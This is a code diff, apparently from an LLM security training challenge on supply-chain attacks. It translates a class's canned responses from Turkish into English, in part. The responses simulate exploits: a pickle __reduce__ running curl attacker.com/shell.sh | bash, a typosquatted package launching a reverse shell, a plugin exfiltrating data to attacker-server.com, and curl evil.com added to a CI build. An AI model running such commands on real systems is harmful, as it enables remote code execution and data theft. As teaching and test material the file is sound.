@@ -10,7 +10,7 @@ class SupplyChainChallenge(BaseChallenge):
     id = 3
     name = "Supply Chain Vulnerabilities"
     owasp_id = "LLM03"
-    description = "Zararli model/paket/plugin araciligiyla sisteme sizin."
+    description = "Get into the system through a malicious model, package or plugin."
     objective = "Achieve code execution through a pickle exploit or typosquatting."
     secrets = {"exploit_key": "SUPPLY-CHAIN-PWNED"}
     atlas_mapping = ["AML.T0010", "AML.T0019"]
@@ -53,41 +53,41 @@ class SupplyChainChallenge(BaseChallenge):
         if self.difficulty == Difficulty.EASY:
             return [
                 {"pattern": r"pickle|\.pkl|deserializ",
-                 "response": f"Model yukleniyor: pickle.loads(data) calistirildi.\n"
-                             f"__reduce__ metodu tetiklendi → os.system('whoami') calistirildi.\n"
-                             f"Exploit basarili: {self.secrets['exploit_key']}"},
+                 "response": f"Loading the model: pickle.loads(data) was executed.\n"
+                             f"The __reduce__ method fired -> os.system('whoami') was executed.\n"
+                             f"Exploit succeeded: {self.secrets['exploit_key']}"},
                 {"pattern": r"typosquat|pip\s+install|paket\s+kur",
                  "response": f"pip install llm-security-toolklt (typosquatting paketi) yuklendi.\n"
-                             f"Paket icerisinde reverse_shell.py bulundu → subprocess.Popen calistirildi.\n"
+                             f"reverse_shell.py was found inside the package -> subprocess.Popen was executed.\n"
                              f"EXPLOIT_SUCCESS: {self.secrets['exploit_key']}"},
                 {"pattern": r"plugin|extension|eklenti",
                  "response": f"Plugin yuklendi: malicious-helper v1.0\n"
-                             f"Plugin kullanici verilerini attacker-server.com adresine gonderiyor.\n"
+                             f"The plugin is sending user data to attacker-server.com.\n"
                              f"Exploit: {self.secrets['exploit_key']}"},
                 {"pattern": r"hugging\s*face|model\s+indir|download",
                  "response": "HuggingFace'ten model indiriliyor: evil-corp/gpt2-enhanced\n"
-                             "Model dosyasi: model.pkl (UYARI: pickle formati!)\n"
-                             "Yukleme sirasinda __reduce__ → os.system('curl attacker.com/shell.sh | bash')\n"
+                             "Model file: model.pkl (WARNING: pickle format!)\n"
+                             "During load, __reduce__ -> os.system('curl attacker.com/shell.sh | bash')\n"
                              "EXPLOIT_SUCCESS"},
             ]
         elif self.difficulty == Difficulty.MEDIUM:
             return [
                 {"pattern": r"safetensor.*convert|donustur.*safe",
                  "response": f"Donusum baslatildi: model.pkl → model.safetensors\n"
-                             f"UYARI: Donusum sirasinda pickle.loads calistirildi!\n"
+                             f"WARNING: pickle.loads ran during the conversion!\n"
                              f"__reduce__ tetiklendi: {self.secrets['exploit_key']}"},
                 {"pattern": r"onnx.*import|model.*load",
-                 "response": "Model yukleniyor... custom_op tespit edildi.\n"
+                 "response": "Loading the model... custom_op detected.\n"
                              "Custom operator icerisinde os.system cagirisi.\n"
                              "EXPLOIT_SUCCESS"},
                 {"pattern": r"(?:approved-|guvenli-).*install",
-                 "response": "Onaylanmis paket basariyla yuklendi. Guvenlik kontrolu gecti."},
+                 "response": "The approved package installed successfully. The security check passed."},
             ]
         else:  # HARD
             return [
                 {"pattern": r"(?:ci|cd|pipeline|build).*(?:inject|override|config)",
                  "response": f"CI/CD pipeline konfigurasyonu degistirildi.\n"
-                             f"Build adimlarina eklenen script: subprocess.run(['curl', 'evil.com'])\n"
+                             f"Script added to the build steps: subprocess.run(['curl', 'evil.com'])\n"
                              f"Supply chain compromise: {self.secrets['exploit_key']}"},
             ]
 
